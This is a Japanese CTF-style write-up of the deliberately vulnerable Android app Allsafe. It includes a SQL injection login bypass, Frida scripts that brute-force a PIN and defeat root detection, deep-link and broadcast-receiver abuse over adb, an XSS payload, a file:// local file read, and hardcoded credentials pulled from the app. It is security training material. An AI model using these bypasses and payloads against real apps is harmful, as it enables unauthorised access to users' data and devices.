---
title: "Allsafe writeup"
date: 2023-08-31T20:48:13+09:00
tag: [Android]
draft: true
---

# Allsafe

- [Allsafe](#allsafe)
  - [Insecure Logging](#insecure-logging)
  - [Hardcode Credentials](#hardcode-credentials)
  - [Firebase Database](#firebase-database)
  - [Insecure Shared Preferences](#insecure-shared-preferences)
  - [SQL injection](#sql-injection)
  - [PIN Bypass](#pin-bypass)
    - [frida を使用したブルートフォースの探索](#frida-を使用したブルートフォースの探索)
    - [password が間違っていてもあっている判定をさせる](#password-が間違っていてもあっている判定をさせる)
  - [Root Detection](#root-detection)
  - [Secure Flag Bypass](#secure-flag-bypass)
  - [Deep Link Exploitation](#deep-link-exploitation)
  - [Insecure Broadcat Receiver](#insecure-broadcat-receiver)
- [Vulnerability WebView](#vulnerability-webview)
  - [XSSを起こす](#xssを起こす)
  - [LFIを起こす](#lfiを起こす)
- [Certificate Pinning](#certificate-pinning)

## Insecure Logging

```text
Simple information disclosure vulnerability. Use the logcat command-line tool to discover sensitive information.
```

Allsafe を起動し、`Insecure Logging`を開きます。

[hacker one](https://hackerone.com/reports/5314)を見るとわかりますが、`logcatに流れる=他のアプリケーションから読み取れる`ということなので、情報漏洩が起こりえます。

脆弱なコードを見てみるとこの部分っぽいです。

```java
public static /* synthetic */ boolean lambda$onCreateView$0(TextInputEditText secret, TextView v, int actionId, KeyEvent event) {
        if (actionId == 6) {
            Editable text = secret.getText();
            Objects.requireNonNull(text);
            if (!text.toString().equals("")) {
                Log.d("ALLSAFE", "User entered secret: " + secret.getText().toString());
                return false;
            }
            return false;
        }
        return false;
    }
```

User entered secret で grep をかけておきます。

text field に値を入れ Enter を押すと取得できていることがわかります。

```bash
$ adb logcat -D Allsafe | grep entered
08-31 21:17:02.544  7481  7481 D ALLSAFE : User entered secret: 123456789
08-31 21:48:18.510  7481  7481 D ALLSAFE : User entered secret: se0r12
```

## Hardcode Credentials

`resources/res/values/strings.xml`

```xml
<string name="dev_env">https://admin:password123@dev.infosecadventures.com</string>
```

という何やら良さそうな url がありました。

`HardcodeCredentials.java`

```xml
<UsernameToken xmlns=\"http://siebel.com/webservices\">superadmin</UsernameToken>\n                 <PasswordText xmlns=\"http://siebel.com/webservices\">supersecurepassword</PasswordText>\n
```

## Firebase Database

`string.xml`をみると、

```xml
<string name="firebase_database_url">https://allsafe-8cef0.firebaseio.com</string>
<string name="gcm_defaultSenderId">983632160629</string>
<string name="google_api_key">AIzaSyDjteCQ0-ElkfBxVZIZmBfCSPNEYUYcK1g</string>
<string name="google_app_id">1:983632160629:android:d1d9132ddd988e7127553c</string>
<string name="google_crash_reporting_api_key">AIzaSyDjteCQ0-ElkfBxVZIZmBfCSPNEYUYcK1g</string>
<string name="google_storage_bucket">allsafe-8cef0.appspot.com</string>
```

このような認証情報らしきものが見える。

firebase_databae_url に`.json`をつけてアクセスすると、

```json
{
  "flag": "5077e90341de49d0ed79b8ee53572dab",
  "secret": "A bug is never just a mistake. It represents something bigger. An error of thinking. That makes you who you are."
}
```

flag が手に入った。

## Insecure Shared Preferences

`UnsecureSharedPreferense.java`

```java
SharedPreferences sharedpreferences = requireActivity().getSharedPreferences("user", 0);
SharedPreferences.Editor editor = sharedpreferences.edit();
editor.putString("username", username.getText().toString());
editor.putString("password", password.getText().toString());
editor.apply();
SnackUtil.INSTANCE.simpleMessage(requireActivity(), "Successful registration!");
```

`username`, `password`, `password again`フィールドに値をいれ、adb で確認すると`/data/data/infosecadventures.allsafe/shared_prefs`に`user.xml`があることが確認できる。

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="password">password</string>
    <string name="username">se0r12</string>
</map>
```

## SQL injection

```java
 public final void onClick(View it) {
    String md5;
    SQLiteDatabase sQLiteDatabase = db;
    StringBuilder sb = new StringBuilder();
    sb.append("select * from user where username = '");
    sb.append(String.valueOf(username.getText()));
    sb.append("' and password = '");
    md5 = SQLInjection.this.md5(String.valueOf(password.getText()));
    sb.append(md5);
    sb.append("'");
    Cursor cursor = sQLiteDatabase.rawQuery(sb.toString(), null);
    Intrinsics.checkNotNullExpressionValue(cursor, "db.rawQuery(\"select * fr….toString()) + \"'\", null)");
    StringBuilder data = new StringBuilder();
    if (cursor.getCount() > 0) {
        cursor.moveToFirst();
        do {
            String user = cursor.getString(1);
            String pass = cursor.getString(2);
            data.append("User: " + user + " \nPass: " + pass + '\n');
        } while (cursor.moveToNext());
        cursor.close();
        Toast.makeText(SQLInjection.this.getContext(), data, 1).show();
    }
    cursor.close();
    Toast.makeText(SQLInjection.this.getContext(), data, 1).show();
}
```

password は md5 でハッシュした結果を探すようです。

```sql
select * from user where username = ' <username> ' and password = ''
```

のようなクエリなので、以下を入れてみます。

```text
adb shell input text "\'\ or\ \'a\'=\'a\'\-\-"
```

コレにより、色々な認証情報が浮かび上がります。

## PIN Bypass

```java
EditText editText2 = pin;
Intrinsics.checkNotNullExpressionValue(editText2, "pin");
checkPin = pinBypass.checkPin(editText2.getText().toString());
```

```java
public final boolean checkPin(String pin) {
    byte[] decode = Base64.decode("NDg2Mw==", 0);
    Intrinsics.checkNotNullExpressionValue(decode, "android.util.Base64.deco…roid.util.Base64.DEFAULT)");
    return Intrinsics.areEqual(pin, new String(decode, Charsets.UTF_8));
}
```

`NDg2Mw==`を base64 deocde した値と比較するというもの。

```bash
$ echo NDg2Mw== | base64 -d
4863
```

`Access granted, good job!`が見えたら勝利

### frida を使用したブルートフォースの探索

テキストフィールドを見ると、4 文字であることがわかる。

つまり、`9 * 9 * 9 * 9 = 6561`通りしか無い。

ブルートフォースでパスワードを無理やり当てることができそうだ。

```javascript
// frida -U -l script.js -f infosecadventures.allsafe

if (Java.available) {
  Java.perform(() => {
    let pinBypassClass = Java.use(
      "infosecadventures.allsafe.challenges.PinBypass"
    ).$new();
    for (let i = 0; i < 10000; i++) {
      let pin = String(i).padStart(4, 0);
      if (pinBypassClass.checkPin(pin)) {
        console.log(`found valid pin: ${i}`);
      }
    }
  });
}
```

```bash
found valid pin: 4863
```

あっているように思えます。

### password が間違っていてもあっている判定をさせる

```java
if (Java.available) {
    Java.perform(()=> {
        let pinBypassClass = Java.use("infosecadventures.allsafe.challenges.PinBypass");
        pinBypassClass.checkPin.implementation = () =>{
            return true;
        }
    });
}
```

これで適当な数字を押しても正解判定されます。

## Root Detection

root を検知してくるというものだろう。

```java
public final void onClick(View it) {
    if (new RootBeer(RootDetection.this.getContext()).isRooted()) {
        SnackUtil snackUtil = SnackUtil.INSTANCE;
        FragmentActivity requireActivity = RootDetection.this.requireActivity();
        Intrinsics.checkNotNullExpressionValue(requireActivity, "requireActivity()");
        snackUtil.simpleMessage((Activity) requireActivity, "Sorry, your device is rooted!");
        return;
    }
    SnackUtil snackUtil2 = SnackUtil.INSTANCE;
    FragmentActivity requireActivity2 = RootDetection.this.requireActivity();
    Intrinsics.checkNotNullExpressionValue(requireActivity2, "requireActivity()");
    snackUtil2.simpleMessage((Activity) requireActivity2, "Congrats, root is not detected!");
}
```

isRootedの実装を見てみると、

```java
public boolean isRooted() {
    return detectRootManagementApps() || detectPotentiallyDangerousApps() || checkForBinary(Const.BINARY_SU) || checkForDangerousProps() || checkForRWPaths() || detectTestKeys() || checkSuExists() || checkForRootNative() || checkForMagiskBinary();
}
```

こいつがfalseを返すようにしてあげれば良さそうです。

`isRooted()`は、`com.scottyab.rootbeer`packageの`RootBeer`クラス内に定義されています。

```javascript
if (Java.available) {
    Java.perform(() => {
        let rootBeerClass = Java.use("com.scottyab.rootbeer.RootBeer");
        rootBeerClass.isRooted.implementation = function() {
            return false;
        }
    });
}
```

実行してあげれば、`Congrats, root is not detected!`で回避できていることがわかるはず。


## Secure Flag Bypass

Secure Flag Bypassの画面は、スクリーンショットを禁じられている。

コレは技術的には脆弱性ではないはず。

## Deep Link Exploitation

`DeeplinkTask.java`
```java
public class DeepLinkTask extends AppCompatActivity {
    /* JADX WARN: Multi-variable type inference failed */
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_deep_link_task);
        Intent intent = getIntent();
        String action = intent.getAction();
        Uri data = intent.getData();
        Log.d("ALLSAFE", "Action: " + action + " Data: " + data);
        try {
            if (data.getQueryParameter("key").equals(getString(R.string.key))) {
                findViewById(2131296383).setVisibility(0);
                SnackUtil.INSTANCE.simpleMessage(this, "Good job, you did it!");
            } else {
                SnackUtil.INSTANCE.simpleMessage(this, "Wrong key, try harder!");
            }
        } catch (Exception e) {
            SnackUtil.INSTANCE.simpleMessage(this, "No key provided!");
            Log.e("ALLSAFE", e.getMessage());
        }
    }
}
```

ここでは、`key`を、`string.xml`内のkeyと比較していそうです。

```xml
<string name="key">ebfb7ff0-b2f6-41c8-bef3-4fba17be410c</string>
```

`AndoridManifest.xml`をみて、ディープリンクを確認してみます。

```xml
        <activity android:name="infosecadventures.allsafe.challenges.DeepLinkTask" android:theme="@style/Theme.Allsafe.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="infosecadventures" android:pathPrefix="/congrats" android:scheme="allsafe"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="https"/>
            </intent-filter>
        </activity>
```

- host: infosecadventures
- pathPrefix: /congrats
- scheme: allsafe

`allsafe:infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c`

にアクセスをすれば良さそう。

```bash
adb shell am start -a "android.intent.action.VIEW" -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
```

## Insecure Broadcat Receiver

`AndoridManifest.xml`を見てみる。

```xml
<receiver android:exported="true" android:name="infosecadventures.allsafe.challenges.NoteReceiver">
    <intent-filter>
        <action android:name="infosecadventures.allsafe.action.PROCESS_NOTE"/>
    </intent-filter>
</receiver>
```

`NoteReceiver.java`
```java
public class NoteReceiver extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String server = intent.getStringExtra("server");
        String note = intent.getStringExtra("note");
        String notification_message = intent.getStringExtra("notification_message");
        OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
        HttpUrl httpUrl = new HttpUrl.Builder().scheme("http").host(server).addPathSegment("api").addPathSegment("v1").addPathSegment("note").addPathSegment("add").addQueryParameter("auth_token", "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=").addQueryParameter("note", note).build();
        Log.d("ALLSAFE", httpUrl.toString());
        Request request = new Request.Builder().url(httpUrl).build();
        okHttpClient.newCall(request).enqueue(new Callback() { // from class: infosecadventures.allsafe.challenges.NoteReceiver.1
            public void onFailure(Call call, IOException e) {
                Log.d("ALLSAFE", e.getMessage());
            }

            public void onResponse(Call call, Response response) throws IOException {
                ResponseBody body = response.body();
                Objects.requireNonNull(body);
                Log.d("ALLSAFE", body.string());
            }
        });
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "ALLSAFE");
        builder.setContentTitle("Notification from Allsafe");
        builder.setContentText(notification_message);
        builder.setSmallIcon((int) R.mipmap.ic_launcher_round);
        builder.setAutoCancel(true);
        builder.setChannelId("ALLSAFE");
        Notification notification = builder.build();
        NotificationManager notificationManager = (NotificationManager) context.getSystemService("notification");
        NotificationChannel notificationChannel = new NotificationChannel("ALLSAFE", "ALLSAFE_NOTIFICATION", 4);
        notificationManager.createNotificationChannel(notificationChannel);
        notificationManager.notify(1, notification);
    }
}
```

`server`, `note`, `notification_message`を受け取り

`http://<server>/api/v1/note/add?auth_token=YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=&note=<note>`というURLを組み立てます。

その後レスポンスを`log`に出力するだけです。

どちらかというと、`notification_message`の方が悪用できそうです。

```java
 NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "ALLSAFE");
        builder.setContentTitle("Notification from Allsafe");
        builder.setContentText(notification_message);
        builder.setSmallIcon((int) R.mipmap.ic_launcher_round);
        builder.setAutoCancel(true);
        builder.setChannelId("ALLSAFE");
        Notification notification = builder.build();
        NotificationManager notificationManager = (NotificationManager) context.getSystemService("notification");
        NotificationChannel notificationChannel = new NotificationChannel("ALLSAFE", "ALLSAFE_NOTIFICATION", 4);
        notificationManager.createNotificationChannel(notificationChannel);
        notificationManager.notify(1, notification);
```

noteを保存したとき、通知が出ることからこの処理がそれを担当しているはずです。

というわけで、以下のコマンドを実行します。

```bash
adb shell am broadcast -a "infosecadventures.allsafe.action.PROCESS_NOTE" --es server "127.0.0.1" --es note "hoge" --es notification_message "custom_message" -n infosecadventures.allsafe/.challenges.NoteReceiver
```

実行すると、`custom_message`と書かれた通知が飛ぶはずです。

# Vulnerability WebView

## XSSを起こす
 
codeを見なくても解ける問題です。

`<script>alert(1)</script>`を入力すると、ポップアップが出るはずです。

## LFIを起こす

LFIなのかDirectory Traversalなのかはファイルタイプによるはずなので怪しいですが、まぁローカルのファイルにアクセスができます

`file:///etc/hosts`を入力すると、`/etc/hosts`ファイルの中身が見えるはずです。

# Certificate Pinning

BurpなりでRequestをみる必要があるようです。




